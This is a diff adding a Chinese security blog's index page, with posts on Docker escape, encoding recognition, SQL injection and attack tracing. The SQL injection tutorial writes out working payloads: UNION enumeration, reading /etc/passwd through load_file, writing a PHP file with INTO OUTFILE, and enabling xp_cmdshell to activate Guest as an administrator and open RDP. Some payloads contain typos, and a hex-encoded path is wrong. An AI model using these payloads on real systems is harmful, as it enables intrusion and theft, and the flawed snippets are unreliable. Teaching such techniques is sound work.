@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Yum~Yum~Yummyl~</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <div id="wrapper">
+    <header id="header">
+  <h1 id="title">
+    <a href="/">Yum~Yum~Yummyl~</a>
+  </h1>
+  <nav>
+    
+    
+      
+      <a class="nav-link" href="/">Home</a>
+    
+      
+        <span class="nav-spacer">×</span>
+      
+      <a class="nav-link" href="/archives">Archives</a>
+    
+    
+  </nav>
+</header>
+
+    <div id="content">
+      
+  
+    <article id="post-docker逃逸是个啥" class="article article-type-post" itemprop="blogPost" itemscope>
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 class="article-title" itemprop="name">
+      <a href="/2021/01/21/docker%E9%80%83%E9%80%B8%E6%98%AF%E4%B8%AA%E5%95%A5/">docker逃逸是个啥</a>
+      
+    </h2>
+  
+
+
+        <div class="article-meta">
+          <time class="article-date" datetime="2021-01-21T15:05:06.000Z" itemprop="datePublished">2021-01-21</time>
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        <pre><code>Docker是当今使用范围最广的开源容器技术之一，具有高效易用的优点。docker可以让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。</code></pre>
+<h1 id="什么是docker逃逸"><a href="#什么是docker逃逸" class="headerlink" title="什么是docker逃逸"></a>什么是docker逃逸</h1><p>docker都是部署在直接宿主机上的，如果攻击者获取了docker业务的某种权限，那么通过某种方式来获取直接宿主机的某种权限下的执行命令能力就叫做docker逃逸。也就是从docker这个牢笼中“逃”出来抵达宿主机的方式。</p>
+<h1 id="docker逃逸类型"><a href="#docker逃逸类型" class="headerlink" title="docker逃逸类型"></a>docker逃逸类型</h1><p>目前的 Docker 逃逸的类型大体可以划分为三种：</p>
+<ul>
+<li>由内核漏洞引起 ——Dirty COW(CVE-2016-5195)（脏牛漏洞）</li>
+<li>由 Docker 软件设计引起——CVE-2019-5736、CVE-2019-14271</li>
+<li>由配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式</li>
+</ul>
+<h1 id="docker逃逸原理"><a href="#docker逃逸原理" class="headerlink" title="docker逃逸原理"></a>docker逃逸原理</h1><h1 id="docker环境判断"><a href="#docker环境判断" class="headerlink" title="docker环境判断"></a>docker环境判断</h1><p>可以使用metasploit中的checkcontainer或checkvm模块来检测，检测原理也很简单：</p>
+<ol>
+<li>检查/.dockerenv文件是否存在；</li>
+<li>检查/proc/1/cgroup内是否包含”docker”等字符串；</li>
+<li>检查是否存在container环境变量。</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+  </div>
+</article>
+
+
+
+  
+    <article id="post-编码的纷纷扰扰" class="article article-type-post" itemprop="blogPost" itemscope>
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 class="article-title" itemprop="name">
+      <a href="/2021/01/21/%E7%BC%96%E7%A0%81%E7%9A%84%E7%BA%B7%E7%BA%B7%E6%89%B0%E6%89%B0/">编码的纷纷扰扰</a>
+      
+    </h2>
+  
+
+
+        <div class="article-meta">
+          <time class="article-date" datetime="2021-01-21T15:04:35.000Z" itemprop="datePublished">2021-01-21</time>
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="教你如何一眼看懂编码"><a href="#教你如何一眼看懂编码" class="headerlink" title="教你如何一眼看懂编码"></a>教你如何一眼看懂编码</h1><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>先说结论，具体区别在后面，<strong>注意，由于并不能从文本信息上查看其编码方式，该方法仅可做大致快速判断，并非绝对正确</strong>；<br>遇到编码问题，可以大致按以下步骤判断：</p>
+<ol>
+<li>有没有“%”百分号，有百分号则为URL编码或base16，如果待测文本不是url就先试一试hex，这里对hex解码时要注意选对编码集（如gb2312或utf-8）；</li>
+<li>有没有“=”等号,有等号则为baseXX（如base64，base32，base58）；</li>
+<li>有没有“&amp;#”取地址符和井号或“&amp;#x”或“\U”或“\U+”，有这样的组合则为Unicode编码；</li>
+<li>如果是“\u”的情况，则为Ascii码；</li>
+<li>根据文件头判断，但也不一定准确<br> EF BB BF　　　 UTF-8<br> FE FF　　　　　UTF-16/UCS-2, 小头存储<br> FF FE　　　　　UTF-16/UCS-2, 大头存储<br> FF FE 00 00　　UTF-32/UCS-4, 小头存储<br> 00 00 FE FF　　UTF-32/UCS-4, 大头存储</li>
+<li>针对文件编码方式，可以用记事本打开，直接编码方式；</li>
+</ol>
+<h2 id="Base64编码特征"><a href="#Base64编码特征" class="headerlink" title="Base64编码特征"></a>Base64编码特征</h2><ul>
+<li>base32的编码表是由（A-Z、2-7）32个可见字符构成，“=”符号用作后缀填充；</li>
+<li>base64的编码表是由（A-Z、a-z、0-9、+、/）64个可见字符构成，“=”符号用作后缀填充；</li>
+<li>base58的编码表相比base64少了数字0，大写字母I，O，小写字母 l (这个是L），以及符号‘+’和‘/’；</li>
+<li>base16就是Hex编码，由16个ASCII可打印字符构成（数字0-9和字母A-F），base16不可能出现“=”；</li>
+</ul>
+<p><strong>举个例子</strong>：<br>base32 原文1234567 =&gt; 密文GEZDGNBVGY3Q====<br>特征：大写字母和数字，不满5的倍数，用‘=’补齐。<br>base64 原文1234567 =&gt; 密文MTIzNDU2Nw==<br>特征：大小写字母和数字，不满3的倍数，用‘=’补齐。<br>base58 原文1234567 =&gt; 密文2s8YYFs4Vc</p>
+<p><strong>举个例子</strong>：<br>编码前：这是测试语句，This is a example , 1234567!<br>经过GB2312编码后：%d5%e2%ca%c7%b2%e2%ca%d4%d3%ef%be%e4%a3%ac%54%68%69%73%20%69%73%20%61%20%65%78%61%6d%70%6c%65%20%2c%20%31%32%33%34%35%36%37%21</p>
+<h2 id="Ascii码特征"><a href="#Ascii码特征" class="headerlink" title="Ascii码特征"></a>Ascii码特征</h2><ul>
+<li>用1个字节的8位数来编码英文字符集，即所有字母数字等英文符号可以用二进制数、十进制、十六进制来表示。比如大写字母A可分别用二进制数（01000001）、十进制（65）、十六进制（0x41）来表示。</li>
+</ul>
+<p><strong>举个例子</strong>：<br>编码前：这是测试语句，This is a example , 1234567!<br>编码后：\u8fd9\u662f\u6d4b\u8bd5\u8bed\u53e5\uff0c\u0054\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0061\u0020\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u0020\u002c\u0020\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0021</p>
+<h2 id="URL编码特征"><a href="#URL编码特征" class="headerlink" title="URL编码特征"></a>URL编码特征</h2><ul>
+<li>一个字符ascii码的十六进制，然后在前面加上% </li>
+</ul>
+<p><strong>举个例子</strong>：<br>编码前：这是测试语句，This is a example , 1234567!<br>编码后：%e8%bf%99%e6%98%af%e6%b5%8b%e8%af%95%e8%af%ad%e5%8f%a5%ef%bc%8cThis+is+a+example+%2c+1234567!</p>
+<h2 id="GBK-GBK2312编码特征"><a href="#GBK-GBK2312编码特征" class="headerlink" title="GBK/GBK2312编码特征"></a>GBK/GBK2312编码特征</h2><ul>
+<li>用2个字节16比特的16进制数表示来编码中文字符集，其中GBK是GBK2312的扩展字符集编码，包含简体、繁体中文、日语、韩语等。基于汉字的宽字节注入就是搞使用这种编码的机器。</li>
+</ul>
+<h2 id="Unicode编码特征"><a href="#Unicode编码特征" class="headerlink" title="Unicode编码特征"></a>Unicode编码特征</h2><ul>
+<li>国际标准字符，将全球的各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台文本信息的转换，当编码和解码的字符集出现不一致的时候就会出现乱码。 </li>
+<li>UTF-8/16/16LE等等都是Unicode的一种实现，Unicode只规定了编码集，</li>
+</ul>
+<p>类似这种形式：<br>&amp;#x [Hex]: &#x0054;&#x0068;&#x0065;<br>&amp;# [Decimal]: &#00084;&#00104;&#00101;<br>\U [Hex]: \U0054\U0068\U0065<br>\U+ [Hex]: \U+0054\U+0068\U+0065 </p>
+<p>UTF-8是Unicode的一种实现，他的出现统一了Unicode编码集对二进制的表示，也就是告诉机器怎么区分三个字节分别代表三个字符，还是三个字节代表一个字符。</p>
+<p>这里先说一下UTF-8的编码规则：<br>UTF-8 的编码规则很简单，只有二条：<br>1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的 Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的。<br>2）对于n字节的符号（n &gt; 1），第一个字节的前n位都设为1，第n + 1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码。</p>
+<p>比如汉字“严”的 Unicode 是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800 - 0000 FFFF），因此严的 UTF-8 编码需要三个字节，即格式是1110xxxx 10xxxxxx 10xxxxxx。然后，从严的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，严的 UTF-8 编码是11100100 10111000 10100101，转换成十六进制就是E4B8A5。</p>
+<p><strong>举个例子</strong>：<br>编码前：这是测试语句，This is a example , 1234567!<br>编码后：&#x8FD9;&#x662F;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#xFF0C;This is a example , 1234567!</p>
+<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>CTF必备技能之编码大全（涉及了CTF混淆相关技术）：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1419464">https://cloud.tencent.com/developer/article/1419464</a><br>Unicode和UTF-8的关系：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tsingke/p/10853936.html">https://www.cnblogs.com/tsingke/p/10853936.html</a></p>
+
+      
+    </div>
+    
+    
+    
+  </div>
+</article>
+
+
+
+  
+    <article id="post-说起各种注入的姿势这件事" class="article article-type-post" itemprop="blogPost" itemscope>
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 class="article-title" itemprop="name">
+      <a href="/2021/01/21/%E8%AF%B4%E8%B5%B7%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A7%BF%E5%8A%BF%E8%BF%99%E4%BB%B6%E4%BA%8B/">说起各种注入的姿势这件事</a>
+      
+    </h2>
+  
+
+
+        <div class="article-meta">
+          <time class="article-date" datetime="2021-01-21T15:04:24.000Z" itemprop="datePublished">2021-01-21</time>
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        <p>一//sql注入一文精通</p>
+<ol>
+<li>知识点回顾</li>
+</ol>
+<p>1.1 什么是sql注入</p>
+<pre><code>注入可以理解为服务器将本不该作为代码执行的用户输入作为代码执行，一般在用户与数据库产生交互的地方都有可能存在sql注入（如有增、删、改、查等操作处）。按注入方式可以有GET注入、POST注入等，按注入点可有Header注入，按显错方式可有显错注入和盲注，还有由于编码而产生的宽字节注入；主流的数据库软件有Mysql, sql server, access mongo db等，他们虽然大同小异，但是在实际注入时还是有许多需要注意的地方，这也是我们要详细讲解的；各种名词突然都搬到桌面上来可能会看着很懵，但不着急，我们一个一个来。</code></pre>
+<p>1.2 sql语句</p>
+<pre><code>sql语句是对数据库进行操作的基本方式，网站或APP后台也是通过这些语句与数据库交互的，我们通过漏洞来进行的sql注入也不例外，都需要这些语句来交互，所以我们首先要熟悉我们的攻击炮弹，才能再去想用什么炮来发射这些炮弹。我将会从增删改查四个方面来讲述，更多的sql语法我将在第二大章的攻击手段中出现并逐一介绍；
+
+1.2.1 增！
+
+添加新用户、新增的交易数据……这些都是向数据库中增加数据，听说过向某连锁酒店后台的会员库中添加入自己的账号并且挪用他人余额给自己账号充值的故事，这个黑帽子用的就是增和改！我们先来说一说“增”这个语句；
+
+insert into table_name value(1,2,3,4,...) &lt;==&gt; 把value(1,2,3,4,...)插入到（insert into）到table_name中；
+
+举一个栗子，比如名字叫crew_basic_infor原表中有三条员工基本信息数据，像这样；
+
+| 姓名 | 年龄 | 性别 | 民族 |
+| 张三 |  18  |  男  |  汉  |
+| 李四 |  27  |  男  |  汉  |
+| 王五 |  26  |  女  | 蒙古 |
+
+我现在在数据库中输入， insert into crew_basic_infor value(&#39;于三十六&#39;, &#39;24&#39;, &#39;男&#39;, &#39;蒙古&#39;)；
+
+那么现在的数据库就变成了：
+
+|   姓名   | 年龄 | 性别 | 民族 |
+|   张三   |  18  |  男  |  汉  |
+|   李四   |  27  |  男  |  汉  |
+|   王五   |  26  |  女  | 蒙古 |
+| 于三十六 |  24  |  男  | 蒙古 |
+
+我们的这条数据就被“插入”进去了昂；
+
+好，基础的讲完了再来点进阶的菜。
+
+1.2.2 删！
+
+删除数据，经常听说有公司运维与管理闹不和删库跑路的，当然最后都被抓住了，这是严重侵害公司利益，同事利益的违法行为。作为一名安全人员也应该有这样的意识，在找漏洞的过程中一定不能对现有公司的业务产生影响，如果必要一定要先报备再干活，不然总有一天会进去的。删库脱库这种事是绝对不能干滴。
+
+言归正传，delete删除，这个sql语句长这个样子:
+
+delete * from table_name(where 姓名=&#39;张三&#39;) &lt;==&gt; 把table_name这个表里的所有(*)(叫张三的(where 姓名=&#39;张三&#39;))数据都删除(delete)掉；
+
+很简单昂，还是这个例子，crew_basic_infor表中数据像这样；
+
+|   姓名   | 年龄 | 性别 | 民族 |
+|   张三   |  18  |  男  |  汉  |
+|   李四   |  27  |  男  |  汉  |
+|   王五   |  26  |  女  | 蒙古 |
+| 于三十六 |  24  |  男  | 蒙古 |
+
+我输入 delete from crew_basic_infor where 姓名=&#39;张三&#39;，表就变成了这样：
+
+|   姓名   | 年龄 | 性别 | 民族 |
+|   李四   |  27  |  男  |  汉  |
+|   王五   |  26  |  女  | 蒙古 |
+| 于三十六 |  24  |  男  | 蒙古 |
+
+1.2.3 改！
+
+有前两个的基础直接上例子：
+接上表，我输入Update table_name set 性别=&#39;女&#39;, 年龄=&#39;30&#39; where 姓名=&#39;李四&#39;
+
+|   姓名   | 年龄 | 性别 | 民族 |
+|   李四   |  30  |  女  |  汉  |
+|   王五   |  26  |  女  | 蒙古 |
+| 于三十六 |  24  |  男  | 蒙古 |
+
+1.2.4 查！
+
+查！是很重要的，我们来好好掰扯掰扯。
+
+select * from from table_name &lt;==&gt; 从(from)table_name表中的选取(select)所有数据(*)
+
+同样的，后面也可以添加限定条件，并且可以用and连接多个条件，where column_name_1=&#39;xx&#39; and column_name_2=&#39;xx&#39;
+
+数据库则会将符合条件的数据返回来，比如输入select * from crew_basic_infor where 姓名=&#39;李四&#39;会返回
+
+|   姓名   | 年龄 | 性别 | 民族 |
+|   李四   |  30  |  女  |  汉  |
+
+同样可以用union/union all语句将多个select语句联合在一起，合并多个select语句的结果，值得注意的是连接的多个select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同，我个人经常忽略这一点...场面经常十分尴尬。
+
+上面说了，union或者union all 都可以做联合查询， 两者的区别在于查询的多个表中有相同数据时，union会只显示其中一个，union all 则会显示全部；</code></pre>
+<p>1.3 常见数据库</p>
+<pre><code>数据库是“按照数据结构来组织、存储和管理数据的仓库”。是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合。大致可分为关系型数据库和非关系型数据库；
+
+百度是这么说的：
+…………关系型数据库，存储的格式可以直观地反映实体间的关系。关系型数据库和常见的表格比较相似，关系型数据库中表与表之间是有很多复杂的关联关系的。 常见的关系型数据库有Mysql，SqlServer等。在轻量或者小型的应用中，使用不同的关系型数据库对系统的性能影响不大，但是在构建大型应用时，则需要根据应用的业务需求和性能需求，选择合适的关系型数据库。…………非关系型数据库，指的是分布式的、非关系型的、不保证遵循ACID原则的数据存储系统。NoSQL数据库技术与CAP理论、一致性哈希算法有密切关系……
+
+看一看就好了，先不用理解，只需要记住关系型数据库使用sql语言，非关系型数据库使用unql语言，剩下的我们一个一个来看，在这一小节中我将根据每一类型的数据的特点并且结合例子来讲解；</code></pre>
+<p>1.3.1 Mysql数据库</p>
+<pre><code>Mysql是关系型数据库，由瑞典公司开发，目前属于Oracle旗下产品。默认端口号是3306，延时命令是sleep()，Mysql是目前最流行的关系型数据库之一，所以关于他的篇幅将多一些。
+
+- 联合查询
+
+找到注入点以后则可以进行联合查询；比如，一个新闻网站会根据不同的id号返回不同的新闻内容，其查询语句是
+
+select * from table_name where id=&#39;用户输入&#39;
+
+我们就可以闭合原本有的单括号，并且在后面输入我们的sql语句[1&#39; order by 10 -- q],先order by 一下来看一看当前库有多少个字段，如下：
+
+select * from table_name where id=&#39;1&#39; order by 10 -- q&#39;
+
+这个语句我们一个部分一个部分的来看，首先，[1&#39;]这个部分，是给原本的select语句传一个正常的id值。 [order by]这个部分作为排序，后面一般情况下跟的是字段名，但是我们在不知道字段名字的时候可以用,12345（罗马数字）来代替，也就是分别代表第一字段，第二字段…… 第三部分[-- q&#39;]，还记得前面讲的[--空]嘛， 因为在url栏中输入末尾的空格会被浏览器省略掉，所以可以使用[+]或者url编码的[%20]来代替空格，或者在--后面加空格和任意字符，来让这个空格不被忽略掉，回车时就会发现，这个空格被替换为[%20]了。
+如果原本表中只有4个字段，那么order by 10必然不会返回正常的结果，所以这一部分可以多试一试，直到返回正常页面为止。
+
+假如我们现在知道这个注入点的关联库有4个字段了，我们现在来找寻显错点，从这里开始就要使用union字段了。现在总体的语句变成了：    
+
+select * from table_name where id=&#39;1&#39; and 1=2 union select 1,2,3,4 -- q&#39;
+
+这里要说一下为什么有一个[and 1=2]， 首先union会结合多个select语句的查询结果然后展现出来，但我们现在就想知道的我们想查的东西，所以 and 1=2 本身是否， 加在前面一个select语句的where 中，第一个select语句也就变成了[select * from table_name where id=&#39;1&#39; and 1=2],这个意思否定句了，不找了。所以在显示的时候只会显示我们后一句的[select 1,2,3,4]， 我们就可以看到了这个注入点的回显点。
+
+以mysql为例子，后面就是老套路了:
+select * from table_name where id=&#39;1&#39; and 1=2 union select 1,TABLE_NAME from INFORMATION_SCHEMA.tables where TABLE_SCHEMA=DATABASE(),3,4 -- q
+select * from table_name where id=&#39;1&#39; and 1=2 union select 1,COLUMN_NAME from INFORMATION_SCHEMA.columns where TABLE_SCHEMA=DATABASE() AND TABLE_NAME=&#39;TABLE_NAME&#39;,3,4 -- q
+
+最后得到库名，表名，字段名，就可以查询了。
+
+- 注释类型
+
+注释在sql注释中用到的很多，mysql中支持三种注释方式，分别是 &#39;#&#39;,&#39;--空&#39;,&#39;/**/&#39;
+
+- 特殊库表
+
+MySQL 5.0 及其以上版本提供了 INFORMATION_SCHEMA，这是一个信息数据库，它提供了访问数据库元数据的方式。下面介绍如何从中读取数据库名称、表名称以及列名称。所以如果网站管理员没有注意到这一点的时候，我们拥有读取INFORMATION_SCHEMA表的权限时，注入就变得简单了许多。
+
+- 特殊函数
+
+-- load_file()读文件函数
+load_file()函数允许用户快速读取文件，但文件的位置必须在服务器上，文件必须为绝对路径，卡额用户必须有FILE权限，文件容量也必须小于max_allowed_packet字节（默认为16MB-1GB），该参数在mysql配置文件my.cnf中
+利用语句如下：
+UNION SELECT 1, load_file(&#39;/etc/passwd&#39;), 3, 4 #
+如果防注入语句不允许单引号出现，那么可以将引号内的文本换成16进制进行绕过，：
+UNION SELECT 1, load_file(0x2F6561342F706173737764), 3, 4 #
+
+-- into outfile()写文件函数
+into outfile()与 load_file() 一样，必须有 FILE 权限，并且文件必须为全路径名称。
+SELECT &#39;&lt;?php phpinfo();?&gt;&#39; into oufile &#39;C:\wwwroot\1.php&#39;
+这一句意思就是把select后面的内容写入文件中，网站管理员可能是这样操作的，这可能有助于你的理解；
+SELECT * FROM test_outfile INTO OUTFILE &quot;C:/Users/Administrator/Desktop/201909/2019-09-03.txt&quot; FIELDS TERMINATED BY &quot;,&quot; ENCLOSED BY &#39;&quot;&#39;;
+
+-- concat()/concat_ws()/group_concat() 连接字符串
+concat函数可以连接一个或多个字符串并且Concat函数在连接字符串的时候，只要其中一个是null，返回就是null；
+concat_ws表示concat with separator,即有分隔符的字符串连接，例如select concat_ws(&#39;|&#39;,&#39;11&#39;,&#39;22&#39;,&#39;33&#39;);//11|22|33；
+group_concat()是必须将group by按照什么东西排序，也打印出来；否则函数不起作用group_concat([DISTINCT] 要连接的字段[Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])；
+
+-- updatexml() 函数执行函数
+首先了解下updatexml()函数：
+updatexml (XML_document, XPath_string, new_value);
+第一个参数：XML_document是String格式，为XML文档对象的名称；
+第二个参数：XPath_string (Xpath格式的字符串) ，
+第三个参数：new_value，String格式，替换查找到的符合条件的数据
+SELECT * FROM message WHERE id = 1 and updatexml(1, (concat(0x7c, (SELECT @@version))), 1)
+其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，报错，会显示出无法识别的内容：
+
+-- extractvalue()函数
+使用方法和上面的Updtexml()类似，同时通过报错来返回数据的。例如SEELCT * FROM message WHERE id= 1 AND extravtvalue(1, concat(0x7c, (SELECT user())))</code></pre>
+<p>1.3.2 Sql Server数据库</p>
+<pre><code>SQL Server数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 1433。数据库后缀名 .mdf，注释符是 -- 。延时命令：WAITFOR  DELAY  &#39;0:0:2&#39;
+
+SQLServer有三个权限级别，sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限；db权限：文件管理，数据库操作等权限 users-administrators；public权限：数据库操作 guest-users；
+
+- 常用命令
+select is_srvrolemember(&#39;sysadmin&#39;) # 判断是否是SA权限
+select is_member(&#39;db_owner&#39;) # 判断是否是db_owner权限
+select is_srvrolemember(&#39;public&#39;) # 判断是否是public权限
+
+select @@version;       #查询数据库的版本
+select @@servername;    #查询服务名
+select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字
+select db_name();       #查询当前数据库名
+select db_name(1);      #查询第一个数据库名
+select db_name(2);      #查询第二个数据库名
+select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner 
+use tempdb              #切换到tempdb表  
+top n                   #查询前n条记录
+limit 2,3               #查询第2条开始的3条数据，也就是2,3,4
+select substring(&#39;string&#39;,2,1)     #截取给定字符串的索引为2的1个字符
+select ascii(&#39;a&#39;)                  #查询给定字符串的ascii值
+select len(&#39;string&#39;)               #查询给定字符串的长度
+EXEC sp_spaceused @updateusage = N&#39;TRUE&#39;;  #查询当前数据库的大小
+sp_spaceused &#39;表名&#39;                #查询指定表名的大小
+
+- 特殊机制
+xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。
+select count(*) FROM master..sysobjects Where xtype = &#39;X&#39; AND name = &#39;xp_cmdshell&#39;#判断xp_cmdshell是否开启
+如果没有开启的话，可以使用下面命令来开启：
+execute(&#39;sp_configure &quot;show advanced options&quot;,1&#39;)  #将该选项的值设置为1
+execute(&#39;reconfigure&#39;)                             #保存设置
+execute(&#39;sp_configure &quot;xp_cmdshell&quot;, 1&#39;)           #将xp_cmdshell的值设置为1
+execute(&#39;reconfigure&#39;)                             #保存设置
+execute(&#39;sp_configure&#39;)                            #查看配置
+execute(&#39;xp_cmdshell &quot;whoami&quot;&#39;)                    #执行系统命令
+
+或者
+exec sp_configure &#39;show advanced options&#39;,1;       
+reconfigure;                                       
+exec sp_configure &#39;xp_cmdshell&#39;,1;                 
+reconfigure;                                      
+exec sp_configure;                                 
+exec xp_cmdshell &#39;whoami&#39;;                         
+
+可以执行系统权限之后,前提是获取的主机权限是administrators组里的
+exec xp_cmdshell &#39;net user Guest 123456&#39;              #给guest用户设置密码
+exec xp_cmdshell &#39;net user Guest /active:yes&#39;         #激活guest用户
+exec xp_cmdshell &#39;net localgroup administrators Guest /add&#39;  #将guest用户添加到administrators用户组
+exec xp_cmdshell &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;        #开启3389端口</code></pre>
+<p>1.3.3 Access数据库</p>
+<p>1.3.4 Orcale数据库</p>
+<p>1.3.5 Mongo db数据库</p>
+<p>1.3.6 Radis</p>
+<pre><code>Redis 是完全开源的，遵守 BSD 协议，是一个高性能的 key-value 数据库。
+
+Redis 与其他 key - value 缓存产品有以下三个特点：
+
+- Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。
+- Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。
+- Redis支持数据的备份，即master-slave模式的数据备份。</code></pre>
+<p>1.3.6 小结</p>
+<ol start="2">
+<li><p>工具详解</p>
+</li>
+<li><p>1 Sqlmap</p>
+</li>
+<li><p>2 源码梳理</p>
+</li>
+<li><p>思路演示</p>
+</li>
+<li><p>参考资料</p>
+<p> [1]关系型数据库，百度百科，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93/8999831?fr=aladdin">https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93/8999831?fr=aladdin</a>;<br> [2]三种数据库的 SQL 注入详解，YT–98，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43915762/article/details/87909751">https://blog.csdn.net/weixin_43915762/article/details/87909751</a>;<br> [3]SQLServer数据库注入详解，谢公子，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/88679754#SA%E6%9D%83%E9%99%90%E5%BC%80%E5%90%AFxp_cmdshell%E8%8E%B7%E5%8F%96%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90">https://blog.csdn.net/qq_36119192/article/details/88679754#SA%E6%9D%83%E9%99%90%E5%BC%80%E5%90%AFxp_cmdshell%E8%8E%B7%E5%8F%96%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90</a></p>
+</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+  </div>
+</article>
+
+
+
+  
+    <article id="post-浅谈溯源" class="article article-type-post" itemprop="blogPost" itemscope>
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 class="article-title" itemprop="name">
+      <a href="/2021/01/21/%E6%B5%85%E8%B0%88%E6%BA%AF%E6%BA%90/">浅谈溯源</a>
+      
+    </h2>
+  
+
+
+        <div class="article-meta">
+          <time class="article-date" datetime="2021-01-21T15:03:53.000Z" itemprop="datePublished">2021-01-21</time>
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="攻击溯源大法"><a href="#攻击溯源大法" class="headerlink" title="攻击溯源大法"></a>攻击溯源大法</h1><h2 id="攻击溯源思路"><a href="#攻击溯源思路" class="headerlink" title="攻击溯源思路"></a>攻击溯源思路</h2><pre><code>知己——常见系统、服务漏洞分类</code></pre>
+<p>如果是在客户现场常驻的情况，需要了解客户网络架构、运行业务、运行设备等，由这三个方面可以大致得知经常出现的、容易被利用的漏洞。如果是临时现场处置，具体需要注意以下几点：攻击发生时间、攻击持续时间、异常机的主要业务情况、异常机所处网络位置、异常机是否连接公网、开放端口、最近是否做过变更、是否做过升级等。根据所获得的情报做出猜想，这里要求对常见漏洞较为熟悉。按上述思想具体举例，比如一个web服务器公网可以访问出现了被挂黑链的事件使用了s2框架，那么初步可以怀疑是s2-045 s2-046之类的命令执行漏洞了；如果一台公网服务器没有安装补丁又没有防火墙防护，administrator的密码为P@sswrod那么有很大的可能性是被暴力破解成功；</p>
+<pre><code>知彼——日志分析取证</code></pre>
+<p>有了猜想就要取证了。根据现场情报、设备日志等对入侵行为做取证，来验证之前的猜想。我们需要知道入侵者去过哪儿、怎么进来的等等，这首先就需要我们知道常见的设备、服务的默认日志存储位置了。拿到了日志，接下来会详细说一说日志分析的东西，日志角度的攻与防也是很好玩滴。</p>
+<pre><code>反攻——吹响反攻的号角</code></pre>
+<p>找到了入侵者的尾巴就要继续乘胜追击，把他薅出来为止。因为在攻防演练中，蓝队可以追查到攻击者个人信息即算是反攻成功得分，所以这一部分会涉及到社工手段。</p>
+<h2 id="常见系统、服务漏洞快查手册"><a href="#常见系统、服务漏洞快查手册" class="headerlink" title="常见系统、服务漏洞快查手册"></a>常见系统、服务漏洞快查手册</h2><h3 id="Linux常见漏洞"><a href="#Linux常见漏洞" class="headerlink" title="Linux常见漏洞"></a>Linux常见漏洞</h3><h4 id="获取权限类"><a href="#获取权限类" class="headerlink" title="获取权限类"></a>获取权限类</h4><ul>
+<li><p><strong>EXP盲打</strong><br>根据现有的EXP可以直接操作的，大多数攻击都是这样利用现有工具进行的；具体可以查阅<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">github库</a>，针对这个库的具体信息可以参考”linux系统内核漏洞利用详解.md”。</p>
+</li>
